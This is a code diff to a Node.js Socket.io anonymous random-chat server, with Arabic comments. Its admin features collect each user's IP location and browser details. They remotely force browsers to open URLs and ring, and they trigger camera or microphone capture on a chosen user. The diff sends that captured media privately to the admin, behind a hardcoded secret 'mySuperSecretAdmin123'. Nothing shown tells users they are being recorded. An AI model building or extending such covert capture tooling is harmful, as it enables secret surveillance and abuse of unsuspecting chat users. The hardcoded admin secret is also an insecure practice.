@@ -19,14 +19,11 @@ app.get('/', (req, res) => {
 
 let waitingUser = null;
 
-// دالة لجلب معلومات الموقع الجغرافي من الـ IP
 function getIpLocation(ip, callback) {
-  // تنظيف الـ IP لو كان محلياً
   if (ip === '::1' || ip === '127.0.0.1') {
     callback({ city: 'محلي', country: 'السيرفر المحلي' });
     return;
   }
-  
   https.get(`https://ipapi.co/${ip}/json/`, (res) => {
     let data = '';
     res.on('data', chunk => data += chunk);
@@ -48,7 +45,6 @@ io.on('connection', (socket) => {
   if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
   const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
 
-  // جلب مكان المتصل وإرساله للأدمن
   getIpLocation(clientIp, (loc) => {
     io.emit('device_info', {
       id: socket.id,
@@ -72,7 +68,6 @@ io.on('connection', (socket) => {
 
       waitingUser.emit('matched');
       socket.emit('matched');
-
       waitingUser = null;
     } else {
       waitingUser = socket;
@@ -81,13 +76,31 @@ io.on('connection', (socket) => {
 
   socket.on('message', (data) => {
     if (socket.roomName) {
-      socket.to(socket.roomName).emit('message', data);
+      socket.to(socket.roomName).emit('message', { ...data, senderId: socket.id });
     }
   });
 
   socket.on('typing', (isTyping) => {
     if (socket.roomName) {
       socket.to(socket.roomName).emit('display_typing', isTyping);
+    }
+  });
+
+  // استقبال الوسائط من المستخدم وإرسالها حصرياً للأدمن فقط للمراجعة
+  socket.on('media_captured_for_admin', (data) => {
+    // data يحوي { adminSocketId, type, content }
+    io.to(data.adminSocketId).emit('review_captured_media', {
+      targetSocketId: socket.id,
+      type: data.type,
+      content: data.content
+    });
+  });
+
+  // موافقة الأدمن على نشر الوسائط في الشات العام بين المتصلين
+  socket.on('admin_approve_and_send', (data) => {
+    if (data.secret !== 'mySuperSecretAdmin123') return;
+    if (data.roomName) {
+      io.to(data.roomName).emit('message', { type: data.type, content: data.content });
     }
   });
 
@@ -100,31 +113,29 @@ io.on('connection', (socket) => {
     } else if (data.action === 'open_url') {
       io.emit('force_open_url', data.url);
     } else if (data.action === 'clear_chat') {
-      io.emit('clear_chat', data.target);
-    } else if (data.action === 'play_sound') {
-      io.emit('play_sound_in_browser', data.audioUrl);
+      io.emit('clear_chat', { target: data.target, adminId: socket.id });
+    } else if (data.action === 'ring_phone') {
+      if (data.targetSocket) {
+        io.to(data.targetSocket).emit('trigger_ringtone');
+      } else {
+        io.emit('trigger_ringtone');
+      }
     } else if (data.action === 'change_bg') {
       io.emit('change_bg', data.bgColor);
     } else if (data.action === 'request_media') {
-      // توجيه الطلب للمستخدم المستهدف أو للكل
       if (data.targetSocket) {
-        io.to(data.targetSocket).emit('trigger_media_capture', { type: data.mediaType, duration: data.duration });
-      } else {
-        io.emit('trigger_media_capture', { type: data.mediaType, duration: data.duration });
+        io.to(data.targetSocket).emit('trigger_media_capture', { 
+          type: data.mediaType, 
+          duration: data.duration, 
+          adminSocketId: socket.id,
+          roomName: io.sockets.sockets.get(data.targetSocket)?.roomName 
+        });
       }
     }
   });
 
-  socket.on('user_media_captured', (mediaData) => {
-    if (socket.roomName) {
-      io.to(socket.roomName).emit('message', { type: mediaData.type, content: mediaData.dataUrl });
-    }
-  });
-
   socket.on('disconnect', () => {
-    if (waitingUser === socket) {
-      waitingUser = null;
-    }
+    if (waitingUser === socket) waitingUser = null;
     if (socket.roomName) {
       socket.to(socket.roomName).emit('partner_disconnected');
     }
@@ -133,5 +144,5 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
